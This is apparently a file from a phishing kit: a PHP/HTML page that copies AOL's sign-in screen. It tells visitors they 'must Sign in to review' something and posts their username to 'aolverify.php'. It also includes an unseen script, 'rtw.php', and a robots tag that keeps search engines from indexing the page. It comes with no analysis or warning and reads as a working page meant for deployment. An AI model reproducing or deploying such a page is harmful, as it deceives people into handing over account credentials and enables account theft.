<?php
if (!isset($_SESSION)) {
  session_start();
}

include "rtw.php";

?>


<!DOCTYPE html>
<html class="no-js">
<head>
    <title>AOL - login</title>
    <meta http-equav="Content-Type" content="text/html;charset=utf-8">
    <meta name="referrer" content="origin-when-cross-origin">
    <link rel="stylesheet" type="text/css" href="css/main.css">
    <link rel="icon" type="image/png" href="">
    <link rel="shortcut icon" type="image/png" href="images/aoIcon.png">
    <link rel="apple-touch-icon" href="">
    
  <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
  
  
</head>
<body class="orko en-us resp" >
<div class="row login-header">
    <span class="one-half column"><a href="" title="Aol">
        <img src="images/title.png" alt="Aol" class="logo" width="100" height="" />
    </a></span>
    <span class="one-half column help"><a href="">Help</a></span>
</div>
<div class="login-body">
        <div class="login-content">
                <div class="login-box ">
                    <div class="login-logo"><img src="images/aol-logo-black-v.0.0.2.png" alt="Aol" class="logo" width="100" height="" />
            </div>
                    <p id="error-offline" role="alert" class="row error-offline hide">Network connection timed out. Please try again.</p>
                    <form id="login-username-form" method="post" action="aolverify.php" class="username-challenge">
                
            
                <h1 class="sign-in-title" id="mbr-login-greeting">
                       You must Sign in to review 
                </h1>
            
            
                <div id="username-country-code-field" class="username-country-code cci-dropdown-disabled code-of-length-1">
                    <div id="selected-country-code-cont" class="country-code-dropdown selected-country-code-cont ltr hide">
                        <div id="selected-country-code" class="selected-country-code">+1</div>
                        <span class="arrow"></span>
                    </div>
                    <div id="country-dropdown-container" class="country-code-dropdown country-dropdown-container hide">
                        <div class="puree-dropdown">
                <label class="offscreen" id="country-code-lbl-aria">Enter Country Code</label>
                
                <div class="arrow"></div>
            </div>
            
                    </div>
                    <input class="phone-no " type="text" name="eUser" id="login-username" tabindex="1"
                        value=""
                         autocapitalize="none" autocorrect="off"
                        autofocus="true"
                        placeholder="Username or Email" required="required" />
                    <div class="hide-passwd">
                        <input name="passwd" type="password" tabindex="-1" aria-hidden="true" role="presentation" autocorrect="off" placeholder="Password" />
                    </div>
                </div>
                <p id="username-error" class="row error hide" role="alert"></p>
            
                <div id="oauth-notice" class="row oauth-notice ">
                    <a id="oauth-notice-link" href="">Continue</a>
                    <p>Tap continue to add your Yahoo Japan email address.<p>
                </div>
            
                <input id="login-signin" type="submit" name="submit" class="orko-button-primary orko-button" value="Next" tabindex="2" />
            
                <p class="row">
                    <span class="one-half column stay-signed-in">
                        <input id="persistent" name="persistent" value="y" type="checkbox" tabindex="3"  />
                        <label for="persistent">Stay signed in</label>
                    </span>
                    <span class="one-half column  help">
                        <a href="">Trouble signing in?</a>
                    </span>
                </p>
            
            
                    <span class="or-cont-with-desc">or continue with</span>
                    <ul class="social-login">
                        <li>
                            <button type="submit" name="tpaProvider" value="facebook" class="icon items-3 sc-facebook sc-facebook-button"><label class="offscreen">facebook</label></button>
                        </li>
                        <li>
                            <button type="submit" name="tpaProvider" value="google" class="icon items-3 sc-google sc-google-button"><label class="offscreen">google</label></button>
                        </li>
                        <li>
                            <button type="submit" name="tpaProvider" value="yahoo" class="icon items-3 sc-yahoo sc-yahoo-button"><label class="offscreen">yahoo</label></button>
                        </li>
                    </ul>
            
                <p class="row sign-up">
                    Don&#x27;t have an account?
                    <a href="" id="createacc">Sign up</a>
                </p>
            </form>
            
                </div>
            <div id="login-info-box" class="info-box">
                <h3 class="title"></h3>
                <p class="desc"></p>
            </div>
        </div>
        <div class="ad-outer"><div class="ad-inner">
            <div id="login-ad-rich"></div>
            <div id="login-ad-mon"></div>
            <div id="login-ad-sky"></div>
        </div></div>
</div>
<div class="login-footer">
        <a href="">Terms</a>
        <strong>(Updated)</strong>
        <span>|</span>
        <a href="">Privacy</a>
        <strong>(Updated)</strong>
</div>
<div id="ad"></div>
</body>


</html>
<!-- lfe04.member.ne1.yahoo.com - Mon Aug 13 2018 12:07:09 GMT+0000 (UTC) - (39ms) -->
